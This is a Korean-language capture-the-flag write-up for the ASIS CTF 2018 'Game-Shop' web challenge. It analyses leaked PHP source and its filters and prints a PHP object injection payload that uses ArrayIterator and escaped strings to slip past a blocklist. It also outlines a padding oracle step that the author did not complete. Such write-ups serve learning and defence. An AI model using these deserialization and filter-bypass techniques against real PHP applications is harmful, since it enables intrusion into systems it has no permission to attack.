# [WEB] ASIS CTF 2018 - GAME-SHOP

## Description

What a shiawase Kokoro sunshine! We opened a new VR [game shop](http://46.101.223.33/aad407a75bda64301f88d29bae5dd799/) just for you, Onii-chan!

## Analysis & Exploit

페이지에 접속하면 소스에서 다음과 같은 주석을 볼 수 있다.

```
こんにちは Hacker-sama!

I decided to put some weebs instead of weeds. Currently, we are on a cutting-edge development.
There are too many bugs in here, so we decided to start a new bug bounty program.
For more information, please check out our security.txt!

Made with love, by the *kawaii* PHP scientist.
```

security.txt에 뭔가가 쓰여있다는 것이다.

security.txt는 버그헌터 및 보안 연구자가 해당 웹 서비스에 취약점을 발견하였을 때, 그 기업에게 전달하는 방법을 정의한 파일이다.(이는 현재 facebook, google 등 큰 기업에서는 시행되고 있다고 한다.(thanks to stypr))

해당파일의 경로는 다음과 같다.

```
/.well-known/security.txt
```

해당 경로를 열면 다음과 같은 내용이 나온다.

```
# security.txt Kawaii Edition
Contact: mailto:imouto@asis.io
Encryption: file:///dev/urandom
Acknowledgements: http://46.101.223.33/
Policy: http://46.101.223.33/policy.txt
Signature: http://46.101.223.33/signature.txt
Hiring: file:///etc/passwd
```

./well-known 디렉토리를 보면 서버소스의 백업이 존재하는 것을 확인할 수 있다.

```
Index of /.well-known/
../
backup.tar.gz                                      11-Apr-2018 14:01              697884
nginx.txt                                          07-Apr-2018 14:59                1190
phpinfo.min.txt                                    07-Apr-2018 14:08               12968
security.txt                                       07-Apr-2018 14:01                 246
```

 backup.tar.gz 의 압축을 풀면 다음의 파일이 존재한다.

```
osehun:~/writeup/ctf/asis/2018/gameshop$ tree
.
├── backup.tar.gz
├── index.php
└── static
    ├── kawaii.css
    ├── nep-congrat.png
    ├── nep-gomen.png
    ├── nep-nope.png
    ├── nep-ok.png
    ├── nep-yasumu.png
    ├── nep.png
    ├── sticker.png
    └── viir.jpg

1 directory, 11 files
```

우선은 index.php를 보도록 하자.

플래그는 3개의 클래스 Affimojas ,Uzume, Neptune 클래스의 소멸자에서 얻을 수 있으며 다음과 같다.

```php
class Affimojas {
    protected $dir = __SECU__;
    private $path;
    private $ban = 3600; // subsequent bantime from attacks
    public function __destruct(){
        $caller = get_class(debug_backtrace()[1]['object']);
        if(in_array($caller, ["Neptune", "Uzume", "Affimojas"])){
            if($this->flag == __FLAG__){
                die(__FLAG__);
            }
        }else{
            $this->add_count("Affimojas Mayday");
            die("Too bad, it's not a good way to wake me up, Hacker-kun! (" . $this->get_count() . "/128)");
        }
    }
    ...
}
class Uzume {
    public $flag = 0;
    private $waf;
    function __construct($flag){
        $this->flag = $flag;
        $this->waf = new Affimojas();
    }
    function __destruct(){
        if(!is_array($this->flag) && !is_string($this->flag) && !is_null($this->flag)){
            if((string)$this->flag['ASIS'] == "kawaii~"){
                die(__FLAG__);
            }
        }
    }
    ...
}
class Neptune {
    protected $cipher = __CIPHER__;
    private $username = "";
    private $password = "";
    private $coin = 0;
    private $waf;
    function __construct($username='', string $password=''){
        if($this->username) return;
        $this->username = $username;
        $this->password = $password;
        $this->waf = new Affimojas();
    }
    function __destruct(){
        if(is_string($this->username) && is_string($this->password)){
            if((string)$this->username == "Neptune"){
                if((string)$this->password == sha1(__SALT__ . __SALT__)){
                    die(__FLAG__);
                }
            }
        }
    }
    ...
}
```

__destruct()를 이용해 공격하기 위해서는 보통 unserialize를 생각할 것이다.

이 문제 또한 Neptune 클래스의 verify 함수에 unserialize하는 부분이 존재하였다.

```php
class Neptune {
    ...
    function verify($session){
        $iv = hex2bin(substr($session, 0, 32));
        $ctext = hex2bin(substr($session, 32));
        $ptext = @openssl_decrypt($ctext, $this->cipher, __SALT__, $options=OPENSSL_RAW_DATA, $iv=$iv);
        if(!$ptext) $this->bye();
        $v = @unserialize($this->waf->waf($ptext));
        if(!$v){
            $this->bye();
            $this->waf->add_count('Malformed Session');
            $this->bye();
        }
        foreach($v as $key => $val){
            if(ctype_print($key)){
                try{ $this->$key = $val; }catch(Exception $e){ return false; }
            }
        }
        $auth = $this->_auth($this->username, $this->password);
        if($auth === True){
            return [$this->username, $this->password, $this->coin];
        }else{
            return false;
        }
    }
    ...
}
```

unserialize 전에 waf를 한번 거치는 것을 확인할 수 있으며 코드는 다음과 같다.

```php
public function waf($data){
    if($this->filter_trials()){
        if(!$data){
            $this->add_count("Malformed data");
            die("Kono-yaro! Malformed data yamero~!!!!!");
        }
        $i = $this->filter_injection($data);
        $s = $this->filter_session($i);
        if(!$i || !$s){
            $this->add_count($data);
            die("Kono-Yaro! You cannot get me, hahaha!");
        }else{
            return $s;
        }
    }else{
        die("Baka Onii-chan! You are blocked from access. Please wait for some time.");
    }
}
```

filter_trials 함수는 공격 횟수를 카운트가 128회가 넘어갈 경우 죽어버린다.

공격 횟수는 filter_injection함수와 filter_session에 의해 필터링 될 경우 올라가게 된다.

```php
private function filter_injection($data){
    $filter = ['.', 'html', __FLAG__, 'bash', 'etc', 'proc', 'file:', 'user:', 'gopher:', 'http:', 'php', 'phtml'];
    ...
}
private function filter_session($data){
    if(is_array($data)) return false;
    $data = str_ireplace(";O:", ";s:", $data);
    $secure_except = ';s:9:"Affimojas":3:';
    if(substr_count($data, $secure_except) == 1){
        $data = str_ireplace($secure_except, ';O:9:"Affimojas":3:', $data);
    }
    $filter = ['asis', 'admin', __FLAG__, 'kawaii', 'StdClass', 'Object', 'String'];
    foreach($filter as $filter_check){
        if(substr_count(strtolower($data), strtolower($filter_check)) > 0) return false;
    }
    $filter = ['"Uzume"', '"Neptune"', '"Affimojas"', 'Database"'];
    foreach($filter as $filter_check){
        if(substr_count(strtolower($data), strtolower($filter_check)) > 1) return false;
    }
}
```

filter들을 우회하여 unserialize를 실행시키면 승리 !

```php
if(!is_array($this->flag) && !is_string($this->flag) && !is_null($this->flag)){
    if((string)$this->flag['ASIS'] == "kawaii~"){
	    die(__FLAG__);
    }
}
```

플래그를 얻기 위한 조건을 보면 array, string, null이 아니면서 array이여야 한다. (?)

여기서 재밌는 트릭이 존재한다.(~~갓 PHP 찬양해라~~)

```
[ dump ]
- ArrayIterator
object(ArrayIterator)#1 (1) { ["storage":"ArrayIterator":private]=> array(1) { ["shpik"]=> int(0) } } 
C:13:"ArrayIterator":37:{x:i:0;a:1:{s:5:"shpik";i:0;};m:a:0:{}}
- ArrayObject
object(ArrayObject)#2 (1) { ["storage":"ArrayObject":private]=> array(1) { ["shpik"]=> int(0) } } 
C:11:"ArrayObject":37:{x:i:0;a:1:{s:5:"shpik";i:0;};m:a:0:{}}
- Array
array(1) { ["shpik"]=> int(0) } 
a:1:{s:5:"shpik";i:0;}

[ Operation ]
- ArrayIterator
[+] you're shpikgod
- ArrayObject
[+] you're shpikgod
- Array
[!] ERRORRRRRR
```

ArrayIterator와 ArrayObject는 Array와 같으면서 is_array함수에는 걸리지 않는다.

waf에 의해 필터링 되어있으므로, 이를 우회하기 위해 ArrayIterator을 이용 및 문자열 치환을 이용해 간단히 쿼리를 만들 수 있다.

```
O:5:"Uzume":1:{s:4:"flag";C:13:"ArrayIterator":41:{x:i:0;a:1:{S:4:"\41SIS";S:7:"\6bawaii~";}}}
```

이로써 문제는 해결될 것이다.

....인줄 알았는데 않이, 왜 camellia-256-CBC로 암호화가 되어 있는가..카멜리아?가 뭔진 모르겠지만 **블록암호 CBC**라는 건 알겠다. 이것은 오라클 패딩 각이다.

```php
function save(){
    global $key;
    $iv = random_bytes(16);
    $enc = bin2hex($iv) . bin2hex(openssl_encrypt(serialize($this), 'camellia-256-cbc', __SALT__, $options=OPENSSL_RAW_DATA, $iv));
    setcookie("donmai", $value = $enc, $expire = time() + 86400 * 30, "/", $_SERVER['HTTP_HOST']);
}
```

즉 이 문제는 Oracle Padding + Unserialize 문제 인 것이다!

공격을 여러번 날리면 문제상 몇분동안(?) 블락을 당하는데, 그 블락이 아직도 유지되고 있어서 Oracle Padding을 수행하지 못하고 위와 같이 unserialize를 통해 플래그를 실행할 수 있다는 것까지만 라이트업을 작성하였다.